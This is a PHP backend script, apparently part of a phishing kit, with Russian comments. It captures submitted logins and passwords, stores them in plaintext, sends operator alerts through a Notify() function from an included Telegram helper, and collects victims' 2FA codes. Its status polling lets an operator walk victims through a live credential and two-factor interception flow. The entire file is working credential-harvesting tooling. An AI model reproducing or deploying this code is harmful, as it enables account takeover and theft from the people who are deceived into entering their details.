<?php
include_once '../config.php';
include_once '../db.php';
include_once 'tg.php';

$status = $_POST['status'];
$login = $_POST['login'];
$password = $_POST['password'];

if(isset($login) && isset($password) && isset($status)) {

    // Первый SUBMIT формы, проверка
    if($status == 'login') {
        // Создание столбца в базе
        $sql = "INSERT INTO accounts (login, password, status) VALUES (?, ?, ?)";
        $pdo->prepare($sql)->execute([$login, $password, 'check']);

        $response = array(
            "status" => 'check',
            "id" => $pdo->lastInsertId(),
        );

        Notify('check', $pdo->lastInsertId());

    } if($status == '2fa') {
        // 2FA Code
        $sql = "UPDATE accounts SET 2fa_code=?, status=? WHERE id=? LIMIT 1";
        $pdo->prepare($sql)->execute(array($_POST['2fa'], 'check', $_POST['id']));

        $response = array(
            "status" => 'check',
            "id" => $_POST['id'],
        );

        Notify('2fa_check', $_POST['id']);

    } if($status == 'false') {
        // 2FA Code
        $sql = "UPDATE accounts SET status=?, password=?, login=? WHERE id=? LIMIT 1";
        $pdo->prepare($sql)->execute(array('check', $password, $login, $_POST['id']));

        $response = array(
            "status" => 'check',
            "id" => $_POST['id'],
        );
        Notify('check', $_POST['id']);
    }  else{
        // Проверка по базе
        $sql = $pdo->prepare("SELECT * FROM accounts WHERE id=? LIMIT 1");
        $sql->execute(array($_POST['id']));
        $sql = $sql->fetch();

        // Успех
        if($sql['status'] == 'true') {
            $response = array("status" => true);
            Notify('true', $_POST['id']);
        }

        // Неуспех
        if($sql['status'] == 'false') {
            $response = array("status" => false);
            Notify('false', $_POST['id']);
        }

        // 2FA
        if($sql['status'] == '2fa') {
            $response = array("status" => '2fa');
            Notify('2fa', $_POST['id']);
        }
    }
}

echo json_encode($response, JSON_UNESCAPED_UNICODE); // Ответ